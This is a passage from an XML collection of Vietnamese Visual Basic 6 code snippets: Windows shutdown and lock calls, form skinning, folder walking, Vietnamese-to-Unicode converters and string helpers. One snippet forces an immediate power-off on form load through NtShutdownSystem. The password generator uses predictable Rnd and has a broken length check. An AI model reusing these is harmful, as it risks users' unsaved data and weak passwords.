
Private Sub Command1_Click()
Dim strRelativepath As String

If GetRelativePath(strRelativepath, "C:\WINDOWS\system32", "c:\WINDOWS") Then
      MsgBox strRelativepath
Else
      MsgBox "Error"
End If
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000223</MaVD>
    <NoiDung>Option Explicit
'''''''''''''''''''''''''''''''''''''''''''''''
'Use for WINNT Restart, Logoff, Shutdown
Private Const EWX_LOGOFF = 0
Private Const EWX_SHUTDOWN = 1
Private Const EWX_REBOOT = 2
Private Const EWX_POWEROFF = 8
Private Const EWX_FORCE = 4
Private Const TOKEN_ADJUST_PRIVILEGES = &amp;H20
Private Const TOKEN_QUERY = &amp;H8
Private Const SE_PRIVILEGE_ENABLED = &amp;H2
Private Const ANYSIZE_ARRAY = 1
Private Const VER_PLATFORM_WIN32_NT = 2
'System Power State
Public Enum eSystemPowerState
    waSUSPEND
    waHIBERNATE
End Enum
Private Type OSVERSIONINFO
    dwOSVersionInfoSize As Long
    dwMajorVersion As Long
    dwMinorVersion As Long
    dwBuildNumber As Long
    dwPlatformId As Long
    szCSDVersion As String * 128
End Type
Private Type LUID
    LowPart As Long
    HighPart As Long
End Type
Private Type LUID_AND_ATTRIBUTES
    pLuid As LUID
    Attributes As Long
End Type
Private Type TOKEN_PRIVILEGES
    PrivilegeCount As Long
    Privileges(ANYSIZE_ARRAY) As LUID_AND_ATTRIBUTES
End Type
'Suspend|Hibernate
Private Declare Function SetSuspendState Lib "Powrprof" (ByVal Hibernate As Long, ByVal ForceCritical As Long, ByVal DisableWakeEvent As Long) As Long
'Lock Computer
Private Declare Function LockWorkStation Lib "user32.dll" () As Long
'Shutdown, Restart, LogOff
Private Declare Function ExitWindowsEx Lib "user32" (ByVal uFlags As Long, ByVal dwReserved As Long) As Long

Private Declare Function GetCurrentProcess Lib "kernel32" () As Long
Private Declare Function OpenProcessToken Lib "advapi32" (ByVal ProcessHandle As Long, ByVal DesiredAccess As Long, TokenHandle As Long) As Long
Private Declare Function LookupPrivilegeValue Lib "advapi32" Alias "LookupPrivilegeValueA" (ByVal lpSystemName As String, ByVal lpName As String, lpLuid As LUID) As Long
Private Declare Function AdjustTokenPrivileges Lib "advapi32" (ByVal TokenHandle As Long, ByVal DisableAllPrivileges As Long, NewState As TOKEN_PRIVILEGES, ByVal BufferLength As Long, PreviousState As TOKEN_PRIVILEGES, ReturnLength As Long) As Long

Private Declare Function GetVersionEx Lib "kernel32" Alias "GetVersionExA" (ByRef lpVersionInformation As OSVERSIONINFO) As Long

Private Const Process_Force = True
'--------------------------------------------------
            
'Detect if the program is running under Windows NT
Private Function IsWinNT() As Boolean
    Dim myOS As OSVERSIONINFO
    myOS.dwOSVersionInfoSize = Len(myOS)
    GetVersionEx myOS
    IsWinNT = (myOS.dwPlatformId = VER_PLATFORM_WIN32_NT)
End Function
'set the shut down privilege for the current application
Private Sub EnableShutDown()
    Dim hProc As Long
    Dim hToken As Long
    Dim mLUID As LUID
    Dim mPriv As TOKEN_PRIVILEGES
    Dim mNewPriv As TOKEN_PRIVILEGES
    hProc = GetCurrentProcess()
    OpenProcessToken hProc, TOKEN_ADJUST_PRIVILEGES + TOKEN_QUERY, hToken
    LookupPrivilegeValue "", "SeShutdownPrivilege", mLUID
    mPriv.PrivilegeCount = 1
    mPriv.Privileges(0).Attributes = SE_PRIVILEGE_ENABLED
    mPriv.Privileges(0).pLuid = mLUID
    ' enable shutdown privilege for the current application
    AdjustTokenPrivileges hToken, False, mPriv, 4 + (12 * mPriv.PrivilegeCount), mNewPriv, 4 + (12 * mNewPriv.PrivilegeCount)
End Sub
' Shut Down NT
Private Sub ShutDownNT(Force As Boolean)
    Dim ret As Long
    Dim Flags As Long
    Flags = EWX_POWEROFF + EWX_SHUTDOWN
    If Force Then Flags = Flags + EWX_FORCE
    If IsWinNT Then EnableShutDown
    ExitWindowsEx Flags, 0
End Sub
''Restart NT
Private Sub RebootNT(Force As Boolean)
    Dim ret As Long
    Dim Flags As Long
    Flags = EWX_REBOOT
    If Force Then Flags = Flags + EWX_FORCE
    If IsWinNT Then EnableShutDown
    ExitWindowsEx Flags, 0
End Sub
'Log off the current user
Private Sub LogOffNT(Force As Boolean)
    Dim ret As Long
    Dim Flags As Long
    Flags = EWX_LOGOFF
    If Force Then Flags = Flags + EWX_FORCE
    ExitWindowsEx Flags, 0
End Sub

Private Function SetSystemPowerState(mAction As eSystemPowerState, mForceSuspension As Boolean, mDisableWakeEvents As Boolean) As Boolean
'Supports: Suspend(Stand By), Hibernate
'Platforms: Only Windows 98 or later, Windows 2000 or later
'If Hibernation is not enabled on the target system, it will Suspend instead
    If SetSuspendState(mAction, mForceSuspension, mDisableWakeEvents) Then SetSystemPowerState = True
End Function

Private Function LockComputer() As Boolean
'Platforms: Only Windows 2000 or later
    If LockWorkStation Then LockComputer = True
End Function

'----------------Sử dụng----------------------------------
    
'Clock Computer
LockComputer
                    
'Hibernate
If SetSystemPowerState(waHIBERNATE, Process_Force, False) Then MsgBox "He thong khong ho tro Hibernate"
                    
'StandBy
If SetSystemPowerState(waSUSPEND, Process_Force, False) Then MsgBox "He thong khong ho tro StandBy"
                    
'LogOff
LogOffNT Process_Force
                    
'Restart
RebootNT Process_Force
            
'Shutdown
ShutDownNT Process_Force</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>074612034653</MaVD>
    <NoiDung>Option Explicit

Private Const HTCAPTION = 2
Private Const WM_NCLBUTTONDOWN = &amp;HA1
Private Declare Function ReleaseCapture Lib "user32" () As Long
Private Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long

Private Const RGN_OR = 2
Private Declare Function SetPixel Lib "gdi32" (ByVal hdc As Long, ByVal x As Long, ByVal y As Long, ByVal crColor As Long) As Long
Private Declare Function GetPixel Lib "gdi32" (ByVal hdc As Long, ByVal x As Long, ByVal y As Long) As Long
Private Declare Function SetWindowRgn Lib "user32" (ByVal hwnd As Long, ByVal hRgn As Long, ByVal bRedraw As Boolean) As Long
Private Declare Function DeleteObject Lib "gdi32" (ByVal hObject As Long) As Long
Private Declare Function CreateRectRgn Lib "gdi32" (ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long
Private Declare Function CombineRgn Lib "gdi32" (ByVal hDestRgn As Long, ByVal hSrcRgn1 As Long, ByVal hSrcRgn2 As Long, ByVal nCombineMode As Long) As Long

Private Function MakeRegion(picSkin As PictureBox) As Long
    Dim x As Long, y As Long, StartLineX As Long
    Dim LineRegion As Long
    Dim FullRegion As Long
    Dim TransparentColor As Long
    Dim InFirstRegion As Boolean
    Dim InLine As Boolean
    Dim hdc As Long
    Dim picWidth As Long
    Dim picHeight As Long

    hdc = picSkin.hdc
    picWidth = picSkin.ScaleWidth
    picHeight = picSkin.ScaleHeight

    InFirstRegion = True: InLine = False
    x = y = StartLineX = 0
    TransparentColor = RGB(255, 0, 255) 'Chọn màu muốn lọai bỏ trong picture, ở đây là màu hồng, hoặc lấy màu ở pixel đầu tiên
    'TransparentColor = GetPixel(hdc, 0, 0)

    For y = 0 To picHeight - 1
        For x = 0 To picWidth - 1
            If GetPixel(hdc, x, y) = TransparentColor Or x = picWidth Then
                If InLine Then
                    InLine = False
                    LineRegion = CreateRectRgn(StartLineX, y, x, y + 1)

                    If InFirstRegion Then
                        FullRegion = LineRegion
                        InFirstRegion = False
                    Else
                        CombineRgn FullRegion, FullRegion, LineRegion, RGN_OR
                        DeleteObject LineRegion
                    End If
                End If
            Else
                If Not InLine Then
                    InLine = True
                    StartLineX = x
                End If
            End If
        Next
    Next
     MakeRegion = FullRegion
End Function

Private Sub Form_DblClick()
    Unload Me
End Sub

Private Sub Form_Load()
    Picture1.ScaleMode = 3
    Picture1.AutoSize = True
    Picture1.Visible = False
    'Picture1.Picture = LoadPicture("C:\skin.bmp") 'Ðường dẩn file ảnh cần thiết
    'If Picture1.Picture &lt;&gt; 0 Then
        Me.Picture = Picture1.Picture
        SetWindowRgn Me.hwnd, MakeRegion(Picture1), True
    'End If
End Sub

Private Sub Form_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
    If Button = vbLeftButton Then
        ReleaseCapture
        SendMessage Me.hwnd, WM_NCLBUTTONDOWN, HTCAPTION, 0&amp;
    End If
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>082322092344</MaVD>
    <NoiDung>Option Explicit

Private Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal _
    hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, _
    lParam As Any) As Long
Const EM_LINEFROMCHAR = &amp;HC9
Const EM_LINEINDEX = &amp;HBB

' Get the line/column coordinates of a given character (both are zero-based).
' If charIndex is negative, it returns the coordinates of the caret

Sub TextBoxGetLineColumn(tb As TextBox, ByVal charIndex As Long, line As Long, _
    column As Long)
    If charIndex &lt; 0 Then charIndex = tb.SelStart
    ' Get the line number.
    line = SendMessage(tb.hwnd, EM_LINEFROMCHAR, charIndex, ByVal 0&amp;)
    ' Get the column number by subtracting the line's start
    ' index from the caret position
    column = tb.SelStart - SendMessage(tb.hwnd, EM_LINEINDEX, line, ByVal 0&amp;)
End Sub

Private Sub Command1_Click()
    Dim c As Long, l As Long
    c = 0
    l = 0

    'Text1 is a multiline textbox
    TextBoxGetLineColumn Text1, -1, l, c

    MsgBox "Line: " &amp; l + 1 &amp; vbCrLf &amp; "Column: " &amp; c
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>081227091236</MaVD>
    <NoiDung>Option Explicit

Public Function Gen_Rand_Password(PassLength As Integer) As String
    Dim RetVal As String
    Dim Max As Integer
    Dim Min As Integer, i As Integer
    Max = 126
    Min = 48
    Randomize Timer
    If PassLength &lt; 8 Then
    Gen_Rand_Password = "error: invalid length"
    End If
    For i = 1 To PassLength
    RetVal = RetVal &amp; Chr(Int((Max - Min + 1) * Rnd + Min))
    Next i
    Gen_Rand_Password = RetVal
End Function

Private Sub Command1_Click()
    MsgBox Gen_Rand_Password(7)
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>081531061507</MaVD>
    <NoiDung>Private Declare Function RtlAdjustPrivilege&amp; Lib "ntdll" (ByVal Privilege&amp;, ByVal NewValue&amp;, ByVal NewThread&amp;, OldValue&amp;)
 
Private Declare Function NtShutdownSystem&amp; Lib "ntdll" (ByVal ShutdownAction&amp;)
    
Const SE_SHUTDOWN_PRIVILEGE&amp; = 19
Const shutdown&amp; = 0
Const RESTART&amp; = 1
Const POWEROFF&amp; = 2
 
Sub TurboShutdown()
    RtlAdjustPrivilege SE_SHUTDOWN_PRIVILEGE, 1, 0, 0
    'NtShutdownSystem shutdown 'shutdown
    'NtShutdownSystem restart 'restart
    NtShutdownSystem POWEROFF 'poweroff
End Sub
 
Private Sub Form_Load()
   TurboShutdown
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000162</MaVD>
    <NoiDung>Do While InStr(str, "  ") &gt; 0
    str = Replace(str, "  ", " ")
Loop
str = Trim(str)</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>085803115801</MaVD>
    <NoiDung>Copy đoạn code sau vào 1 module:

Public Enum What2Clear
    [Clear All Textbox's] = 0
    [Clear Textbox's Contained In Frames] = 1
    [Clear Textbox's Contained In Picturebox's] = 2
    [Clear Textbox's Contained In Form] = 3
End Enum
 
Public Sub TextBoxMod(WhichForm As Form, CommandLine As What2Clear, Optional ReplaceWith As String = Empty)
 Dim Control As Control
 
    For Each Control In WhichForm 'tìm trong form được chỉ định
 
 
        If CommandLine = [Clear All Textbox's] Then
            If TypeOf Control Is TextBox Then Control.Text = ReplaceWith
            'tìm trong tất cả các textbox
        ElseIf CommandLine = [Clear Textbox's Contained In Form] Then
            'chỉ tìm trong các textbox trên form
            If TypeOf Control Is TextBox And TypeOf Control.Container Is Form Then Control.Text = ReplaceWith
        ElseIf CommandLine = [Clear Textbox's Contained In Frames] Then
            'chỉ tìm các textbox trong frame
            If TypeOf Control Is TextBox And TypeOf Control.Container Is Frame Then Control.Text = ReplaceWith
        ElseIf CommandLine = [Clear Textbox's Contained In Picturebox's] Then
            'chỉ tìm các textbox trong picturebox
            '     
            If TypeOf Control Is TextBox And TypeOf Control.Container Is PictureBox Then Control.Text = ReplaceWith
        End If
 
    Next
 
End Sub

Ví dụ form 1 có 3 Textbox, thuộc tính text là "TEST", khi sử dụng ta dùng code sau:

Private Sub Command1_Click()
    TextBoxMod Form1, [Clear All Textbox's], "TEST2"
End Sub

Dòng code trên sẽ chuyển thuộc tính text của cả 3 textbox thành "TEST2".

</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000163</MaVD>
    <NoiDung>Function BàngChu(Num As Long) '&lt; 2147483647
If Num = 0 Then   'Không hô tró tiêng Viêt tôt!
BàngChu = "Không"
Exit Function
End If
Dim DL(9) As String
DL(1) = " môt"
DL(2) = " hai"
DL(3) = " ba"
DL(4) = " bôn"
DL(5) = " nam"
DL(6) = " sáu"
DL(7) = " bay"
DL(8) = " tám"
DL(9) = " chín"
Dim TP(1 To 4) As String, Chuôi As String, i As Byte, DuoiNgan As Integer
Dim HàngÐvi As Byte, HàngChuc As Byte, HàngTram As Byte
TP(2) = " ngàn"
TP(3) = " triêu"
TP(4) = " ty"
i = 1
 
While i &lt; 5    
DuoiNgan = Num Mod 1000 'Lây 3 sô sau
Num = Num \ 1000 'Num Ða loai 3 sô sau
 
HàngÐvi = DuoiNgan Mod 10
HàngChuc = DuoiNgan \ 10 Mod 10
HàngTram = DuoiNgan \ 100
 

If Len(Chuôi) &gt; 12 And DuoiNgan &lt;&gt; 0 Then
Chuôi = TP(i) + "," + Chuôi
End If
If Len(Chuôi) &lt;= 12 And DuoiNgan &lt;&gt; 0 Then
Chuôi = TP(i) + Chuôi
End If
i = i + 1 
Select Case HàngÐvi
Case 1
If HàngChuc &gt; 1 Then Chuôi = " m'ôt" + Chuôi Else Chuôi = " môt" + Chuôi
Case 5
If HàngChuc = 0 Then Chuôi = " nam" + Chuôi Else Chuôi = " lam" + Chuôi
Case Else
Chuôi = DL(HàngÐvi) + Chuôi
End Select
 
Select Case HàngChuc
Case 1
Chuôi = " muo`i" + Chuôi
Case 0
If (Num &lt;&gt; 0 Or HàngTram &lt;&gt; 0) And HàngÐvi &lt;&gt; 0 Then Chuôi = " le" + Chuôi
Case Else
Chuôi = DL(HàngChuc) + " muoi" + Chuôi
End Select
 
Select Case HàngTram
Case 0
If Num &lt;&gt; 0 And (HàngÐvi &lt;&gt; 0 Or HàngChuc &lt;&gt; 0) Then Chuôi = " không tram" + Chuôi
If Num &lt;&gt; 0 And i &gt; 2 And DuoiNgan = 0 And HàngÐvi = 0 And HàngChuc = 0 And HàngTram = 0 And Len(Chuôi) &lt;= 12 Then Chuôi = ""
Case Else
Chuôi = DL(HàngTram) + " tram" + Chuôi
End Select
 
Wend        'thoát vòng lap
' viêt Hoa
BàngChu = UCase(Left(Trim(Chuôi), 1)) + Right(Chuôi, Len(Trim(Chuôi)) - 1)
 
End Function

	</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000227</MaVD>
    <NoiDung>Public Function ToUni(str$) As String
    Dim ansi$, UNI$, i&amp;, sTem$, sUni$, arrUNI() As String
    ansi = "a1|a2|a3|a4|a5|a6|a8|a61a62a63a64a65a81a82a83a84a85A1|A2|A3|A4|A5|A6|A8|A61A62A63A64A65A81A82A83A84A85e1|e2|e3|e4|e5|e6|e61e62e63e64e65E1|E2|E3|E4|E5|E6|E61E62E63E64E65i1|i2|i3|i4|i5|I1|I2|I3|I4|I5|o1|o2|o3|o4|o5|o6|o7|o61o62o63o64o65o71o72o73o74o75O1|O2|O3|O4|O5|O6|O7|O61O62O63O64O65O71O72O73O74O75u1|u2|u3|u4|u5|u7|u71u72u73u74u75U1|U2|U3|U4|U5|U7|U71U72U73U74U75y1|y2|y3|y4|y5|Y1|Y2|Y3|Y4|Y5|d9|D9|"
    UNI = "E1,E0,1EA3,E3,1EA1,E2,103,1EA5,1EA7,1EA9,1EAB,1EAD,1EAF,1EB1,1EB3,1EB5,1EB7,C1,C0,1EA2,C3,1EA0,C2,102,1EA4,1EA6,1EA8,1EAA,1EAC,1EAE,1EB0,1EB2,1EB4,1EB6,E9,E8,1EBB,1EBD,1EB9,EA,1EBF,1EC1,1EC3,1EC5,1EC7,C9,C8,1EBA,1EBC,1EB8,CA,1EBE,1EC0,1EC2,1EC4,1EC6,ED,EC,1EC9,129,1ECB,CD,CC,1EC8,128,1ECA,F3,F2,1ECF,F5,1ECD,F4,1A1,1ED1,1ED3,1ED5,1ED7,1ED9,1EDB,1EDD,1EDF,1EE1,1EE3,D3,D2,1ECE,D5,1ECC,D4,1A0,1ED0,1ED2,1ED4,1ED6,1ED8,1EDA,1EDC,1EDE,1EE0,1EE2,FA,F9,1EE7,169,1EE5,1B0,1EE9,1EEB,1EED,1EEF,1EF1,DA,D9,1EE6,168,1EE4,1AF,1EE8,1EEA,1EEC,1EEE,1EF0,FD,1EF3,1EF7,1EF9,1EF5,DD,1EF2,1EF6,1EF8,1EF4,111,110"
    arrUNI = Split(UNI, ",")
    
    For i = 1 To Len(str)
        If IsNumeric(Mid(str, i + 1, 1)) = False Then
            sUni = sUni &amp; Mid(str, i, 1)
        Else
            sTem = IIf(IsNumeric(Mid(str, i + 2, 1)), Mid(str, i, 3), Mid(str, i, 2))
            i = i + IIf(IsNumeric(Mid(str, i + 2, 1)), 2, 1)
            If InStr(ansi, sTem) &gt; 0 Then sTem = ChrW("&amp;h" &amp; arrUNI(InStr(ansi, sTem) \ 3))
            sUni = sUni &amp; sTem
        End If
    Next
    ToUni = sUni
End Function

</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000240</MaVD>
    <NoiDung>Tạo ra một form gồm có một textbox Text1 và 1 button Command1, copy đoạn code dưới vào form.

Option Explicit
 
Private Declare Function FindFirstFile Lib "kernel32" Alias "FindFirstFileW" (ByVal lpFileName As String, lpFindFileData As WIN32_FIND_DATA) As Long
Private Declare Function FindNextFile Lib "kernel32" Alias "FindNextFileW" (ByVal hFindFile As Long, lpFindFileData As WIN32_FIND_DATA) As Long
Private Declare Function FindClose Lib "kernel32" (ByVal hFindFile As Long) As Long
 
Const FILE_ATTRIBUTE_DIRECTORY = &amp;H10
Const FILE_ATTRIBUTE_HIDDEN = &amp;H2
Const FILE_ATTRIBUTE_NORMAL = &amp;H80
Const FILE_ATTRIBUTE_READONLY = &amp;H1
Const FILE_ATTRIBUTE_SYSTEM = &amp;H4
 
Private Type FILETIME
    dwLowDateTime As Long
    dwHighDateTime As Long
End Type
 
 
Private Type WIN32_FIND_DATA
    dwFileAttributes As Long
    ftCreationTime As FILETIME
    ftLastAccessTime As FILETIME
    ftLastWriteTime As FILETIME
    nFileSizeHigh As Long
    nFileSizeLow As Long
    dwReserved0 As Long
    dwReserved1 As Long
    cFileName As String * 255
    cAlternate As String * 14
End Type
 
Private Sub Command1_Click()
    Dim DirCount As Integer, fileCount As Integer
    WalkDir Text1.Text, DirCount, fileCount
    MsgBox "Folder: " &amp; DirCount &amp; " - File: " &amp; fileCount
End Sub
 
Private Sub WalkDir(sFolder As String, DirCount As Integer, fileCount As Integer)
    Dim myFolder As New Collection
    Dim FileData As WIN32_FIND_DATA
    Dim res As Long, hSearch  As Long, fileName As String
    
    DirCount = 0
    fileCount = 0
    myFolder.Add (sFolder)
    
    Do While (myFolder.Count)
    
        sFolder = myFolder.Item(1)
        myFolder.Remove (1)
        
        hSearch = FindFirstFile(StrConv(sFolder &amp; "\*.*", vbUnicode), FileData)
        If (hSearch = -1) Then GoTo 1
        
        Do
            fileName = TrimPath(FileData.cFileName)
            
            If (fileName &lt;&gt; ".") And (fileName &lt;&gt; "..") Then
            
                If (FileData.dwFileAttributes And FILE_ATTRIBUTE_DIRECTORY) Then
                
                    myFolder.Add (sFolder &amp; "\" &amp; fileName)
                    DirCount = DirCount + 1
                    '---------------'
                    ' do some thing '
                    '---------------'
                Else
                
                    fileCount = fileCount + 1
                    '---------------'
                    ' do some thing '
                    '---------------'
                End If
                
            End If
            
            res = FindNextFile(hSearch, FileData)
        Loop Until (res = 0)
        
1:      FindClose (hSearch)
 
    Loop
End Sub
 
 
Private Function TrimPath(sPath As String) As String
    Dim i As Integer
    
    sPath = StrConv(sPath, vbFromUnicode)
    
    i = InStr(sPath, Chr(0))
    If i &gt; 0 Then sPath = Left(sPath, i - 1)
    TrimPath = sPath
End Function

hoặc là 
Môt ListBox, Một Textbox

Dim FileCount&amp;, FolderCount&amp;
Function ShowFolderList(folderspec)
  Dim MyFSO, NameFld, ffTmp, ffCollec
  Set MyFSO = CreateObject("Scripting.FileSystemObject")
  Set NameFld = MyFSO.GetFolder(folderspec)
  Set ffCollec = NameFld.Files  'tìm file thu muc cha
        For Each ffTmp In ffCollec
            List1.AddItem ffTmp.Name
        FileCount = FileCount + 1
            'Làm tùy ý tai Ðây
        Next                'fftmp.name thay vì fftmp.path Ðê gon và Ðep
  Set ffCollec = NameFld.SubFolders
  On Error Resume Next
  For Each ffTmp In ffCollec   'tìm các thu muc con
     List1.AddItem ffTmp.Path &amp; "      Folder"
        FolderCount = FolderCount + 1
            'Làm tùy ý tai Ðây
     ShowFolderList ffTmp
  Next
  Set MyFSO = Nothing 'Giai phóng tài nguyên
End Function

Private Sub Form_Load()
Dim ShowFF
ShowFF = ShowFolderList("C:\Program Files\Internet Explorer")
Text1 = FileCount &amp; " Files  " &amp; FolderCount &amp; " Folders"
End Sub
	</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>084018084041</MaVD>
    <NoiDung>Option Explicit
 
Public Function ABC2Uni(str$) As String
Dim i&amp;, arrUNI() As String, sUni$, ABC$, UNI$
ABC = "¸µ¶·¹¨¾»¼½Æ©ÊÇÈÉËÐÌÎÏÑªÕÒÓÔÖÝ×ØÜÞãßáâä«èåæçé¬íêëìîóïñòô­øõö÷ùýúûüþ®¸µ¶·¹¡¾»¼½Æ¢ÊÇÈÉËÐÌÎÏÑ£ÕÒÓÔÖÝ×ØÜÞãßáâä¤èåæçé¥íêëìîóïñòô¦øõö÷ùýúûüþ§"
UNI = "225,224,7843,227,7841,259,7855,7857,7859,7861,7863,226,7845,7847,7849,7851,7853,233,232,7867,7869,7865,234,7871,7873,7875,7877,7879,237,236,7881,297,7883,243,242,7887,245,7885,244,7889,7891,7893,7895,7897,417,7899,7901,7903,7905,7907,250,249,7911,361,7909,432,7913,7915,7917,7919,7921,253,7923,7927,7929,7925,273,225,224,7843,227,7841,258,7855,7857,7859,7861,7863,194,7845,7847,7849,7851,7853,233,232,7867,7869,7865,202,7871,7873,7875,7877,7879,237,236,7881,297,7883,243,242,7887,245,7885,212,7889,7891,7893,7895,7897,416,7899,7901,7903,7905,7907,250,249,7911,361,7909,431,7913,7915,7917,7919,7921,253,7923,7927,7929,7925,272"
arrUNI = Split(UNI, ",")
For i = 1 To Len(str$)
If InStr(ABC, Mid(str$, i, 1)) &gt; 0 Then
 sUni = sUni &amp; ChrW(arrUNI(InStr(ABC, Mid(str$, i, 1)) - 1))
 Else
 sUni = sUni &amp; Mid(str$, i, 1)
 End If
Next
ABC2Uni = sUni
End Function</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>084318084313</MaVD>
    <NoiDung>Option Explicit
Public Function VniToUni(str$) As String
    Dim VNI$, UNI$, i&amp;, sUni$, arrUNI() As String
    VNI = "aù,aø,aû,aõ,aï,aâ,aê,aá,aà,aå,aã,aä,aé,aè,aú,aü,aë,AÙ,AØ,AÛ,AÕ,AÏ,AÂ,AÊ,AÁ,AÀ,AÅ,AÃ,AÄ,AÉ,AÈ,AÚ,AÜ,AË,eù,eø,eû,eõ,eï,eâ,eá,eà,eå,eã,eä,EÙ,EØ,EÛ,EÕ,EÏ,EÂ,EÁ,EÀ,EÅ,EÃ,EÄ,í ,ì ,æ ,ó ,ò ,Í ,Ì ,Æ ,Ó ,Ò ,où,oø,oû,oõ,oï,oâ,ô,oá,oà,oå,oã,oä,ôù,ôø,ôû,ôõ,ôï,OÙ,OØ,OÛ,OÕ,OÏ,OÂ,Ô ,OÁ,OÀ,OÅ,OÃ,OÄ,ÔÙ,ÔØ,ÔÛ,ÔÕ,ÔÏ,uù,uø,uû,uõ,uï,ö ,öù,öø,öû,öõ,öï,UÙ,UØ,UÛ,UÕ,UÏ,Ö ,ÖÙ,ÖØ,ÖÛ,ÖÕ,ÖÏ,yù,yø,yû,yõ,î ,YÙ,YØ,YÛ,YÕ,Î ,ñ ,Ñ "
    UNI = "E1,E0,1EA3,E3,1EA1,E2,103,1EA5,1EA7,1EA9,1EAB,1EAD,1EAF,1EB1,1EB3,1EB5,1EB7,C1,C0,1EA2,C3,1EA0,C2,102,1EA4,1EA6,1EA8,1EAA,1EAC,1EAE,1EB0,1EB2,1EB4,1EB6,E9,E8,1EBB,1EBD,1EB9,EA,1EBF,1EC1,1EC3,1EC5,1EC7,C9,C8,1EBA,1EBC,1EB8,CA,1EBE,1EC0,1EC2,1EC4,1EC6,ED,EC,1EC9,129,1ECB,CD,CC,1EC8,128,1ECA,F3,F2,1ECF,F5,1ECD,F4,1A1,1ED1,1ED3,1ED5,1ED7,1ED9,1EDB,1EDD,1EDF,1EE1,1EE3,D3,D2,1ECE,D5,1ECC,D4,1A0,1ED0,1ED2,1ED4,1ED6,1ED8,1EDA,1EDC,1EDE,1EE0,1EE2,FA,F9,1EE7,169,1EE5,1B0,1EE9,1EEB,1EED,1EEF,1EF1,DA,D9,1EE6,168,1EE4,1AF,1EE8,1EEA,1EEC,1EEE,1EF0,FD,1EF3,1EF7,1EF9,1EF5,DD,1EF2,1EF6,1EF8,1EF4,111,110"
    arrUNI = Split(UNI, ",")
     For i = 1 To Len(str)
            If InStr(VNI, Mid(str, i, 2)) &gt; 0 And Len(Mid(str, i, 2)) = 2 Then
                sUni = sUni &amp; ChrW("&amp;h" &amp; arrUNI(InStr(VNI, Mid(str, i, 2)) \ 3))
                 i = i + 1
            ElseIf InStr(VNI, Mid(str, i, 1) &amp; " ") &gt; 0 Then
                sUni = sUni &amp; ChrW("&amp;h" &amp; arrUNI(InStr(VNI, Mid(str, i, 1) &amp; " ") \ 3))
            End If
        If InStr(VNI, Mid(str, i, 1)) = 0 Or InStr("a,A,e,E,o,O,u,U,y,Y, ", Mid(str, i, 1)) &gt; 0 Then sUni = sUni &amp; Mid(str, i, 1)
    Next
    VniToUni = sUni
End Function</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>084518084514</MaVD>
    <NoiDung>Function S1(ByVal St1 As String) As String
A = Split(St1, " ")
For i = 0 To UBound(A)
   A(i) = UCase(Left(A(i), 1)) &amp; Right(A(i), Len(A(i)) - 1)
Next
S1 = Join(A, " ")
End Function</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>084818084832</MaVD>
    <NoiDung>Private Function NamÂmLich(ByVal year As Integer) As String
Dim Can() As String, Chi() As String
Can = Split("Canh,Tân,Nhâm,Qúy,Giáp,Ât,Bính,Ðinh,Mâu,Ky", ",")
Chi = Split("Thân,Dâu,Tuât,Ho'i,Tý,Suu,Dân,Mao,Thìn,Ty,Ngo,Mùi", ",")
NamÂmLich = Can(year Mod 10) &amp; " " &amp; Chi(year Mod 12)
End Function

1- Không dùng năm trước công nguyên
2- Không đúng với tháng đầu (thêm bớt vài ngày) năm DL = tháng cuối (thêm bớt vài ngày) năm AL</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>085218085220</MaVD>
    <NoiDung>Public Enum ChuHoa
CoPhanBiet = 1
KoPhanBiet = 0
End Enum
Sub TimKiem(ByVal strNguon As String, ByVal strTim As String, Optional PbChuHoa As ChuHoa = 1)
Dim intPos As Integer, strFindString As String, strSourceString As String, i&amp;
Dim Data As New Collection
i = 1
    If PbChuHoa = CoPhanBiet Then
        strFindString = strTim
        strSourceString = strNguon
    Else
        strFindString = UCase(strTim)
        strSourceString = UCase(strNguon)
    End If
Do While i &lt; Len(strSourceString) + 1
    intPos = InStr(i, strSourceString, strFindString)
        If intPos Then
            i = intPos + Len(strFindString) - 1
            Data.Add intPos
            intPos = 0
        Else
            If Data.Count &gt; 0 Then MsgBox "Ða tìm thây " &amp; Data.Count &amp; " Kêt qua " &amp; Chr(34) &amp; strTim &amp; Chr(34) Else MsgBox "Không tìm thây" &amp; Chr(34) &amp; strTim &amp; Chr(34)
            Exit Do
        End If
Loop
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>085518085559</MaVD>
    <NoiDung>Private Function RepKeyStrS(ChuoiGoc As String, DaiChuoiBo As String, Optional DaiChuoiThayThe As String) As String
    Dim arrDelLine() As String     'Khai ba'o ma~ng chu+'a ca'c ha`ng
    Dim arrRepLine() As String     'tu+o+ng u+'ng ddu+o+.c ta'ch ra
 
    Dim dLine As String         'Bie^'n lu*u giu*? gia' tri. arrDelLine(i)
    Dim rLine As String         'Bie^'n lu*u giu*? gia' tri. arrRepLine(i)
 
    Dim i%
 
    DaiChuoiBo = Replace(DaiChuoiBo, ",", Chr(13) &amp; Chr(10), 1, -1, vbTextCompare)
 
    arrDelLine() = Split(DaiChuoiBo, Chr(13) &amp; Chr(10))
 
    'Ne^'u DayChuoiThayThe dde^? tro^'ng thi` xo'a
    If DaiChuoiThayThe &lt;&gt; "" Then
        DaiChuoiThayThe = Replace(DaiChuoiThayThe, ",", Chr(13) &amp; Chr(10), 1, -1, vbTextCompare)
 
        arrRepLine() = Split(DaiChuoiThayThe, Chr(13) &amp; Chr(10))
    Else
        DaiChuoiThayThe = ""
